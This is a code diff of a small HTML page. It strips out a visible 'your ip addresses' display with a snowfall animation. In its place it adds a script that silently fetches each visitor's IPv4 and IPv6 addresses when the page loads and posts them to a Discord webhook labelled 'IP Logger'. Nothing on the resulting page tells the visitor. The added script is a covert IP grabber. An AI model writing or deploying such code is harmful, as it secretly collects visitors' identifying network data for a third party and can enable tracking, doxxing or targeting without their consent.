@@ -4,121 +4,59 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>title</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-
-    .snowflake {
-      position: fixed;
-      top: -10px;
-      color: white;
-      font-size: 1em;
-      opacity: 0.8;
-      user-select: none;
-      pointer-events: none;
-      animation-name: fall;
-      animation-timing-function: linear;
-      animation-iteration-count: infinite;
-    }
-
-    @keyframes fall {
-      0% { transform: translateY(0) rotate(0deg); opacity: 1; }
-      100% { transform: translateY(110vh) rotate(360deg); opacity: 0; }
-    }
-
-    body {
-      background: black;
-      color: white;
-      font-family: arial, sans-serif;
-      height: 100vh;
-      overflow: hidden;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .container {
-      background: rgba(0, 0, 0, 0.8);
-      border-radius: 20px;
-      padding: 30px;
-      text-align: center;
-      position: relative;
-      z-index: 2;
-      transition: transform 0.1s ease-in-out, box-shadow 0.1s ease-in-out;
-    }
-
-    .glow {
-      position: absolute;
-      top: -10px;
-      left: -10px;
-      right: -10px;
-      bottom: -10px;
-      border-radius: 30px;
-      box-shadow: 0 0 20px rgba(255, 255, 255, 0.5);
-      z-index: -1;
-      pointer-events: none;
-    }
-
-    .container:active {
-      transform: scale(1.1);
-      box-shadow: 0 0 50px rgba(255, 255, 255, 0.9);
-    }
-
-    h1 {
-      font-size: 28px;
-      margin-bottom: 20px;
-      text-shadow: 0 0 10px rgba(255,255,255,0.8);
-    }
-
-    p {
-      font-size: 20px;
-      margin: 10px 0;
-    }
-
-    .ip {
-      font-size: 22px;
-      font-weight: bold;
-      text-shadow: 0 0 8px rgba(255,255,255,0.9);
-    }
-  </style>
 </head>
 <body>
-  <div class="container">
-    <div class="glow"></div>
-    <h1>your ip addresses</h1>
-    <p><strong>ipv4:</strong> <span id="ipv4" class="ip">fetching...</span></p>
-    <p><strong>ipv6:</strong> <span id="ipv6" class="ip">fetching...</span></p>
-  </div>
-
   <script>
-    const numFlakes = 50;
-    for (let i = 0; i < numFlakes; i++) {
-      let snowflake = document.createElement('div');
-      snowflake.classList.add('snowflake');
-      snowflake.style.left = Math.random() * 100 + 'vw';
-      snowflake.style.fontSize = Math.random() * 1.5 + 0.5 + 'em';
-      snowflake.style.animationDuration = Math.random() * 3 + 4 + 's';
-      snowflake.style.animationDelay = Math.random() * 5 + 's';
-      snowflake.innerHTML = '&#10052;';
-      document.body.appendChild(snowflake);
-    }
-
-    async function fetchIP(elementId, url, type) {
+    // Function to fetch IP address from a given URL
+    async function fetchIP(url) {
       try {
         const response = await fetch(url);
-        if (!response.ok) throw new Error("no response");
+        if (!response.ok) throw new Error("Failed to fetch");
         const data = await response.json();
-        document.getElementById(elementId).textContent = data.ip;
+        return data.ip;
       } catch (error) {
-        document.getElementById(elementId).textContent = `you don't have ${type}`;
+        return null;
       }
     }
 
-    fetchIP("ipv4", "https://api.ipify.org?format=json", "ipv4");
-    fetchIP("ipv6", "https://api64.ipify.org?format=json", "ipv6");
+    // Function to send IP addresses to a Discord webhook
+    async function logToDiscord(ipv4, ipv6) {
+      const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace with your Discord webhook URL
+      const payload = {
+        username: "IP Logger",
+        embeds: [{
+          title: "New Visitor IP Logged",
+          color: 16711680,
+          fields: [
+            { name: "IPv4", value: ipv4 || "Not available", inline: true },
+            { name: "IPv6", value: ipv6 || "Not available", inline: true }
+          ],
+          footer: { text: "IP Detection System" },
+          timestamp: new Date().toISOString()
+        }]
+      };
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+      } catch (error) {
+        console.error("Error sending webhook:", error);
+      }
+    }
+
+    // Fetch IP addresses and log them to Discord
+    async function init() {
+      const ipv4 = await fetchIP("https://api.ipify.org?format=json");
+      const ipv6 = await fetchIP("https://api64.ipify.org?format=json");
+
+      // Log the fetched IPs to the Discord webhook
+      await logToDiscord(ipv4, ipv6);
+    }
+
+    init();
   </script>
 </body>
 </html>
